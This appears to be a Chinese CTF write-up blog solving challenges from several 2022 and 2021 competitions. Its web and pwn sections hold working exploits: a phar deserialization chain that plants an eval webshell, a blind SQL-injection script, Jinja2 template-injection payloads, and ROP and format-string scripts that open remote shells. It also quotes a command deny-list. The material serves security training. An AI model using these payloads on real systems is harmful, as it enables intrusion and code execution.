ufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla
docx中去除字体隐藏，得到a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==
将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag

我的手要不行辣图片补上89 50 4E 47，内容是zip
ocr后另存为，数字暴力破解得到8686
解压得到‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=
千千秀字的在线音符解密得到flag&#123;y0u_fi0d_m2_f1ag&#125;
来玩捉迷藏呀lsb得到一串字符串63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........
将字节异或51后发现恰好是50 4b.....
f=open(&#x27;1.txt&#x27;)d=f.read()d=d.decode(&#x27;hex&#x27;)e=&#x27;&#x27;for i in d:    e+=chr(ord(i)^51)f=open(&#x27;1.zip&#x27;,&#x27;wb&#x27;)f.write(e)f.close()

解压后得到一个docx
将字体变成黑色得到flag
2022HECTF调查问卷问卷
没大没小的鼓励赛后复现
根据hint得知密码是wocenimenma
进行大小写爆破

sstv得到YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=

base64得到b8d55688410af102549de756eb3da854
md5得到litangdj
web迷路的小狮1：hebnu is a good site.
传入http://121.4.119.164:32063/hebnu
2: Can you use another way of requesting？
post传入hebnu
3: 来自官网的你～。～
添加Referer: https://www.hebtu.edu.cn
4：Can you come to my house to see me?
添加X-Forwarded-For: 127.0.0.1
5：Internet Explorer is the best browser！
添加User-Agent: Internet Explorer
最后在返回包的头中得到一串js，在控制台输入得到flag

擎天注sqlmap一把梭

cute_pipi对show参数用伪协议读文件
index.php
&lt;?phperror_reporting(0);define(&#x27;FROM_INDEX&#x27;, 1);include(&#x27;class.php&#x27;);$file=$_POST[&#x27;file&#x27;];$show = empty($_GET[&#x27;show&#x27;]) ? &#x27;home&#x27; : $_GET[&#x27;show&#x27;];if(!is_string($show) || preg_match(&#x27;/\.\./&#x27;, $show) || preg_match(&#x27;/zip/i&#x27;,$show))    die(&#x27;Not this !!!&#x27;);ob_start(&#x27;ob_gzhandler&#x27;);function page_tshow($show) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;	&lt;div id=&quot;header&quot;&gt;		&lt;center&gt;&lt;a href=&quot;?show=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt;	&lt;/div&gt;	&lt;div id=&quot;body&quot;&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=&quot;article&quot;&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;page_tshow($show);if(!(include $show . &#x27;.php&#x27;))    fatal(&#x27;no no no&#x27;);if(isset($file))&#123;    if(file_exists($file))        echo $file.&quot;	surely exists&quot;;    else        echo $file.&quot;	dont exist&quot;;&#125;?&gt;

class.php
&lt;?phpclass HeCTF&#123;    public $hectf;    public $cmd;    public function __destruct()&#123;        if( isset($this-&gt;hectf) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;,$this-&gt;hectf) &amp;&amp; intval($this-&gt;hectf))            if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;, $this-&gt;cmd))&#123;                die(&#x27;No no no no no!&#x27;);            &#125;        exec($this-&gt;cmd);    &#125;&#125;

构造png
exp
&lt;?phpclass HeCTF&#123;    public $hectf;    public $cmd=&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;;    public function __destruct()&#123;        if( isset($this-&gt;hectf) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;,$this-&gt;hectf) &amp;&amp; intval($this-&gt;hectf))            if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;, $this-&gt;cmd))&#123;                die(&#x27;No no no no no!&#x27;);            &#125;        print($this-&gt;cmd);        // exec($this-&gt;cmd);    &#125;&#125;$phar =new Phar(&quot;awsl.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);$a = new HeCTF();$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();@unlink(&quot;./ez.png&quot;);copy(&quot;./awsl.phar&quot;,&quot;./ez.png&quot;);unlink(&quot;./awsl.phar&quot;);?&gt;

上传生成的ez.png，触发payload

访问生成的cmd.php，成功rce

crypto流动的音符在线音符解密得到EA&gt;N?s:WZgTdPYbMSaYg
将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律

matrix题目没出好，flag直接是明文的放在文件中
ezrsa先小指数爆破，得到p和q，通过n/q/p得到t。通过模不互素得到flag
import gmpy2def boom(c_,n_,e_):    i=0    while 1:        if (gmpy2.iroot(c_+i*n_,e_)[1]==1):            return  gmpy2.iroot(c_+i*n_,e_)[0]        i=i+1p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843p=boom(p_,n,2)q=boom(q_,n,2)t=n//p//qif (t*p*q!=n):    print(&quot;error&quot;);    exit(0)e =114phi_n= (p - 1) * (q - 1)*(t-1)t=gmpy2.gcd(e,phi_n)e=e//td=gmpy2.invert(e,phi_n)m=gmpy2.powmod(c,d,n)msg=gmpy2.iroot(m,t)print(bytes.fromhex(hex(msg[0])[2:]))



pwn签到传入\x00绕过判断

exp
from pwn import *p=remote(&#x27;49.234.8.239&#x27;,&#x27;30531&#x27;)p.sendline(&#x27;\x00&#x27;)p.interactive()


输入:!/bin/sh，使得vim中可以执行系统命令

真·签到传入一个0xFFFFF82即可


static栈溢出构造rep链，执行execve(&quot;/bin/sh&quot;)


exp
from pwn import *import timecontext.arch=&#x27;amd64&#x27;context.log_level=&#x27;debug&#x27;rdi=0x00000000004018b2rsi=0x000000000040661erdx=0x00000000004017bfret=0x000000000040f408syscall=0x00000000004012e3rax=0x0000000000451aa7read=0x450ff0#p=remote()#p=process(&#x27;./static&#x27;)#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)#pause()p=remote(&#x27;121.4.119.164&#x27;,&#x27;32430&#x27;)e=ELF(&#x27;./static&#x27;,checksec=0)p.send(b&#x27;a&#x27;*0x29)payload=flat(        rdi,0,        rsi,e.bss(0x100),        rdx,0x20,        read,        rdi,e.bss(0x100),        rsi,0,        rdx,0,        ret,        rax,0x3b,        syscall);p.send(b&#x27;a&#x27;*0x28+b&#x27;b&#x27;*8+b&#x27;c&#x27;*8+payload)p.interactive()#for i in range(8):#    p.sendline(&#x27;+&#x27;)#for i in range(8):#    p.sendline(&#x27;+&#x27;)p.sendline(&#x27;/bin/sh\x00&#x27;)p.interactive()

reverseapk赛后复现

贝斯输入的数据经过某种加密后对每个字节取反，然后与P0w3r的内容比较在Enc0de中看字符集发现是base32加密

将P0w3r变量的内容提取出来后异或0xff，base32解码即可
exp
import base64a=[0xB5,0xBD,0xBC,0xAA,0xB8,0xA9,0xBC,0xB8,0xAF,0xB1,0xBA,0xAA,0xB8,0xCA,0xB3,0xAC,0xB0,0xB2,0xA5,0xAA,0xCD,0xC9,0xB4,0xAB,0xB0,0xAD,0xAE,0xA7,0xBA,0xCB,0xA5,0xAD,0xB1,0xA5,0xBD,0xB8,0xAC,0xCA,0xBB,0xAA,0xB8,0xB1,0xA5,0xBA,0xB0,0xCB,0xAB,0xB5,0xB8,0xB1,0xAB,0xBC,0xB2,0xA9,0xA5,0xAE,0xB8,0xB1,0xC9,0xAE]e=&#x27;&#x27;for i in a:    e+=chr(i^0xff)e+=&#x27;====&#x27;print(base64.b32decode(e))




HelloIos一个简单的比较，异或0x1F然后加1

exp
a=&#x27;X[]LZeX&#123;ttqAwqmc&#x27;e=&#x27;&#x27;for i in a:    e+=chr((ord(i)^0x1f)+1)print(e)


author’sB0x观察发现init_S,init_Key,permute_S,create_key_stream这几个函数中用到的数据是固定的，用来生成KeyStream

直接粘贴到编译器运行
#include&lt;stdio.h&gt;unsigned char S[256]=&#123;&#125;;unsigned char T[256]=&#123;&#125;;unsigned char Key[]=&quot;thisiskey&quot;;unsigned char KeyStream[32]=&#123;&#125;;unsigned int *init_S(void)&#123;  unsigned int *result; // rax  int i; // [rsp+Ch] [rbp-4h]  for ( i = 0; i &lt;= 255; ++i )  &#123;    result = S;    S[i] = i;  &#125;  return result;&#125;unsigned char *init_Key(void)&#123;  unsigned char *result; // rax  int i; // [rsp+Ch] [rbp-4h]  for ( i = 0; i &lt;= 255; ++i )  &#123;    result = T;    T[i] = Key[i % 9];  &#125;  return result;&#125;unsigned int *permute_S(void)&#123;  unsigned int *result; // rax  int v1; // [rsp+4h] [rbp-Ch]  int i; // [rsp+8h] [rbp-8h]  int v3; // [rsp+Ch] [rbp-4h]  v3 = 0;  for ( i = 0; i &lt;= 255; ++i )  &#123;    v3 = (S[i] + v3 + (char)T[i]) % 256;    v1 = S[i];    S[i] = S[v3];    result = S;    S[v3] = v1;  &#125;  return result;&#125;char  create_key_stream(int a2)&#123;  int v2; // eax  char result; // al  int v4; // [rsp+10h] [rbp-10h]  int v5; // [rsp+14h] [rbp-Ch]  int v6; // [rsp+18h] [rbp-8h]  int i; // [rsp+1Ch] [rbp-4h]  v5 = 0;  v6 = 0;  for ( i = 0; ; KeyStream[v5++] = S[(S[v6] + S[i]) % 256] )  &#123;    v2 = a2--;    result = v2 != 0;    if ( !result )      break;    i = (i + 1) % 256;    v6 = (v6 + S[i]) % 256;    v4 = S[i];    S[i] = S[v6];    S[v6] = v4;  &#125;  return result;&#125;void main()&#123;   init_S();  init_Key();  permute_S();  create_key_stream(32);  for (int i=0;i&lt;32;i++)&#123;	printf(&quot;%d &quot;,KeyStream[i]);  &#125;&#125;

运行后得到[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]，这个就是KeyStream的值
KeyStream的值与Cry的值异或，得到flag
exp
a=[0xC3,0xF5,0xE5,0xE2,0xEC,0x17,0xE5,0x2A,0xCA,0x3,0xB6,0xFD,0xC1,0xBC,0x70,0x44,0x10,0xCD,0xA6,0x13,0x0B,0x9A,0x73,0x6,0x0E,0x4D,0xDE,0x95,0x12,0x9C,0xD9,0x46]b=[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]e=&#x27;&#x27;for i,v in enumerate(a):    e+=chr(v^b[i])print(e)

勇士斗恶龙在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址38B0

x64dbg动态调试程序，在主要函数设置断点

当程序中断时，rcx的值是00000170E3A824B0，储存了两个指针，指向了勇士和恶龙的对象


0x170e3a828e0+0x20地址处储存了勇士的金币数，将其修改为0xffff,购买高级的装备，将内存地址转移到0x170e3a82950+0x20指向的地址处，输入a攻击恶龙，观察内存数据变化,当恶龙血量为520时得到flag

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>HECTF</tag>
        <tag>2022竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2021金砖企业信息系统安全决赛</title>
    <url>/posts/281f37d9/</url>
    <content><![CDATA[2021年就比完了初赛，但是因为疫情没能办成决赛，今年6月重启了比赛
CryptoCrypto-1base64-&gt;base32-&gt;base64–&gt;base64
Crypto-2变种凯撒
上图引用的caesar是自定义的模块
class caesar:    &quot;&quot;&quot;        Type==1: Offset letters only        Type==2: Offset numbers only        Type==3: 1+2        Type==4: All characters    &quot;&quot;&quot;    def __init__(self):        text=&quot;&quot;        self.Type=1    def setType(self,Type):        if Type in [1,2,3,4]:            self.Type=Type        else:            print(&quot;Invalid type&quot;)    def encode(self,text,num):        entext=&#x27;&#x27;        if self.Type==1:            for i in range(0,len(text)):                if text[i].isupper():                    decup=(ord(text[i])-65+num)%26                    entext+=chr(decup+65)                elif text[i].islower():                    decup=(ord(text[i])-97+num)%26                    entext+=chr(decup+97)                else:                    entext+=text[i]            self.entext=entext        elif self.Type==2:            for i in range(0,len(text)):                if text[i].isnumeric():                    decup=(ord(text[i])-0x30+num)%10                    entext+=chr(decup+0x30)                else:                    entext+=text[i]            self.entext=entext        elif self.Type==3:            for i in range(0,len(text)):                if text[i].isupper():                    decup=(ord(text[i])-65+num)%26                    entext+=chr(decup+65)                elif text[i].islower():                    decup=(ord(text[i])-97+num)%26                    entext+=chr(decup+97)                elif text[i].isnumeric():                    decup=(ord(text[i])-0x30+num)%10                    entext+=chr(decup+0x30)                else:                    entext+=text[i]            self.entext=entext        elif self.Type==4:            for i in range(0,len(text)):                decup=(ord(text[i])-0x30+num)%128                entext+=chr(decup)            self.entext=entext        return self.entext    def decode(self,text,num=0):        detext=&#x27;&#x27;        self.delist=[]        self.detext=&#x27;&#x27;        if self.Type==1:            for j in range(num%26,26):                detext=&#x27;&#x27;                for i in range(0,len(text)):                    if text[i].isupper():                        decup=(ord(text[i])-65+j)%26                        detext+=chr(decup+65)                    elif text[i].islower():                        decup=(ord(text[i])-97+j)%26                        detext+=chr(decup+97)                    else:                        detext+=text[i]                self.delist.append(detext)                if num:                    self.detext=detext        elif self.Type==2:            for j in range(num%10,10):                detext=&#x27;&#x27;                for i in range(0,len(text)):                    if text[i].isnumeric():                        decup=(ord(text[i])-0x30+j)%10                        detext+=chr(decup+0x30)                    else:                        detext+=text[i]                self.delist.append(detext)                if num:                    self.detext=detext        elif self.Type==3:            for j in range(num%26,26):                for k in range(num%10,10):                    detext=&#x27;&#x27;                    for i in range(0,len(text)):                        if text[i].isupper():                            decup=(ord(text[i])-65+j)%26                            detext+=chr(decup+65)                        elif text[i].islower():                            decup=(ord(text[i])-97+j)%26                            detext+=chr(decup+97)                        elif text[i].isnumeric():                            decup=(ord(text[i])-0x30+k)%10                            detext+=chr(decup+0x30)                        else:                            detext+=text[i]                    self.delist.append(detext)                    if num:                        self.detext=detext;        elif self.Type==4:            for j in range(num%128,128):                detext=&#x27;&#x27;                for i in range(0,len(text)):                    decup=(ord(text[i])-128+j)%128                    detext+=chr(decup)                self.delist.append(detext)                if num:                    self.detext=detext        if len(self.detext):            return self.detext        if len(self.delist):            return self.delist
两次base64得到flag
Crypto-3先分解n
e和phi不互素
import gmpy2n = 22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311e = 180c = 17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559q = 149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527p = 149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993n1=n-p-q+1t=gmpy2.gcd(e,n1)e=e//td=gmpy2.invert(e,n1)m=gmpy2.powmod(c,d,n)msg=gmpy2.iroot(m,t)print(bytes.fromhex(hex(msg[0])[2:]))


Crypto-4ADFGVX解密百度得到原题
MiscMisc-1直接strings
Misc-2binwalk分解出一堆zlib文件使用ls | grep -v zlib | xargs strings命令可以发现结尾有一串字符串两次base64后得到flag
Misc-3文件尾发现id you try lsb?stegsolve发现ff d8,另存为jpg
十六进制模式下发现一串字符串
base64解密后得到flag
Misc-4音频文件，播放后具有非常明显的sstv特征在手机上使用robot36监听得到flag

WEBWeb-1在js中可以看到游戏的逻辑
访问23881361B86C77CD.php，点击key在这里会跳转，抓包，在返回值中得到flag

Web-2简单过滤的sql盲注exp：
import requestsimport urllib.parsedef sqlinjet(url,payload):    header=&#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;,        &#x27;Cookie&#x27;: &quot;UM_distinctid = 175b18dcb384ba-0f290792fb4f06-230346d-144000-175b18dcb39493;CNZZDATA1261218610 =1200642698-1605001662-%7C1605366994&quot;,        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;            &#125;    flag=&#x27;&#x27;    for i in range(1,100):        low = 32        high = 128        mid = (low + high) // 2        while(low &lt; high):            data = &#123;                &#x27;uname&#x27;: payload.format(i,mid),                &#x27;passwd&#x27;: &quot;1&quot;,            &#125;            r = requests.post(url=url,data=data,headers=header)            print(data)            if &#x27;不存在此用户&#x27; in r.text:               low = mid + 1            else:               high = mid            mid = (low + high) // 2        flag += chr(mid)        print(flag)        if mid == 32 or mid == 132:            breakurl=&#x27;http://101.133.132.222:8002/login.php&#x27;payload_all_database=&quot;&quot;payload_database=&quot;1&#x27;^(ascii(substring((select(database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;payload_table=&quot;1&#x27;^(ascii(substring((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where(table_schema=database()))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;uname=&quot;1&#x27;^(ascii(substring((select(group_concat(uname))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;password=&quot;1&#x27;^(ascii(substring((select(group_concat(passwd))from(admin))from(&#123;&#125;)))&gt;&#123;&#125;)^&#x27;1&quot;sqlinjet(url,password)

注入得到密码，md5解密后得到5555666

登录拿到flag
Web-4扫描目录得到index.php.bak
得到部分源代码
md5($_GET[&#x27;name&#x27;]) == md5($_GET[&#x27;pwd&#x27;])
php弱比较，传入两个数组即可
payload:http://101.133.132.222:8004/index.php?name[]=admin&amp;pwd[]=admin123
Web-5题目url后的路径可控，会直接回显出来尝试xss和ssti发现存在xss，但是xss不好利用，使用&#123;&#123;7*7&#125;&#125;测试，发现也存在ssti注入
报错后得到框架是jinja2
fuzz后发现过滤了class.关键字，可以通过加号拼接class来绕过
先获取FileLoader类http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()&#125;&#125;

调用类get_data方法读文件http://101.133.132.222:8005/&#123;&#123;()['__cla'+'ss__'].__base__['__subclas'+'ses__']()[79]["get_data"](0,"/flag")&#125;&#125;

ReverseReverse-1直接strings
PWNPwn-1查看代码发现main函数中存在两次格式化字符串
通过第一次格式化字符串获取__libc_start_main函数地址同时获取libc地址，通过libc获取system函数地址
通过第二次格式化字符串将fini_array替换为main函数使我们可以再次输入数据，并把printf函数在got表中的数据修改为system函数地址这样在第二次执行main函数时，输入/bin/sh或sh就可以执行system(&quot;/bin/sh&quot;)来获取shell了

exp
from pwn import *libc=ELF(&#x27;libc-2.23.so&#x27;,checksec=0)e=ELF(&#x27;./pmagic&#x27;,checksec=0)p=remote(&#x27;106.14.91.65&#x27;,10000)#p=process(&#x27;pmagic&#x27;)#gdb.attach(p,&#x27;bp 0x400838&#x27;)p.readuntil(&#x27;name.\n&#x27;)p.send(&#x27;%43$p&#x27;)d=int(p.readuntil(&#x27;Say&#x27;,drop=1)[:-1],16)-240libc.address=d-libc.sym[&#x27;__libc_start_main&#x27;]system=libc.sym[&#x27;system&#x27;]fini=0x600a78printf=e.got[&#x27;printf&#x27;]main=0x400797print(hex(main))print(hex(fini))print(hex(system))print(hex(printf))a=[0x97,0x7,0x40]i=systemwhile i!=0:    a.append(i&amp;0xff)    i=i&gt;&gt;8b=[fini,fini+1,fini+2,printf,printf+1,printf+2,printf+3,printf+4,printf+5]c=&#123;&#125;for i in range(0,len(a)):    c[a[i]]=b[i]a.sort()print(a)print(b)print(c)payload=&#x27;&#x27;n=0for i in range(0,len(a)):    if i&gt;0:        payload+=&#x27;%&#x27;+str(a[i]-a[i-1])+&#x27;c%&#x27;+str(28+i)+&#x27;$hhn&#x27;    else:        payload+=&#x27;%&#x27;+str(a[i])+&#x27;c%&#x27;+str(28+i)+&#x27;$hhn&#x27;    n=n+1print(hex(len(payload)))payload=payload.ljust(0xa0,&#x27;a&#x27;)for i in a:    payload+=p64(c[i])print(hex(len(payload)))print(payload)p.sendline(payload)p.interactive()


]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>金砖</tag>
      </tags>
  </entry>
  <entry>
    <title>2022台州市第二届网络安全大赛wp</title>
    <url>/posts/b1b57dcc/</url>
    <content><![CDATA[初赛miscbitlocker内存取证，在内存镜像中搜索txt文件，得到BitLocker恢复密钥

导出后得到
BitLocker 驱动器加密恢复密钥恢复密钥用于恢复 BitLocker 保护的驱动器上的数据。若要验证该密码是否为正确的恢复密码，请将这些标记与恢复屏幕上显示的标记进行比较。恢复密钥标记: 118D5B0A-0C1F-4F完整恢复密钥标记: 118D5B0A-0C1F-4F76-A3B7-01658D566145BitLocker 恢复密钥:432696-262691-480018-407649-083578-365651-065142-713999

在windows7虚拟机上挂载bitlocker.vmdk，使用恢复密钥432696-262691-480018-407649-083578-365651-065142-713999解锁，拿到flag文件
文件开头为42 4d，判断是bmp文件，但是文件头被修改了
删掉文件头和文件尾，文件长度除以4后为39949，因式分解得到7*13*439，所以宽高是439*91
用python生成一个宽为439，高为91的rgba格式的bmp文件，和原文件比较，还原文件头，得到flag

皇帝的flagcrc报错，修改高度，得到二维码，扫码得到‌‌‌‌‍‬‍‍‌‌‌‌‍‌﻿‍‌‌‌‌‍﻿‌‌只有聪明的人才能得到‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‌‬flag‌‌‌‌‌﻿‌‌‌‌‌‌‍‍‌‬‌‌‌‌‍‍﻿﻿哦‌‌‌‌‍﻿‌‌‌‌‌‌‍‍‍﻿‌‌‌‌‍‌‍‌
在010中看到很多不可见字符，0宽得到密码eMp3r0R_pWD
stegsolve分析，存在lsb隐写

列文虎克的秘密这是什么题呀，太离谱了，十位密码爆破。100分简单题到结束才三血
赛后复现
先修复zip头，改成50 4B 03 04，然后进行十位数字爆破，得到874375984
图片尾看到oursecret特征块，密码是图片上的列文虎克名字LeEuw3nh0ek
reverseEzMath1先脱upx壳，在TlsCallback_1函数中找到程序实际用于检测的代码

sub_401210函数检测输入的前7个字符

sub_401670函数检测其余输入的字符

exp
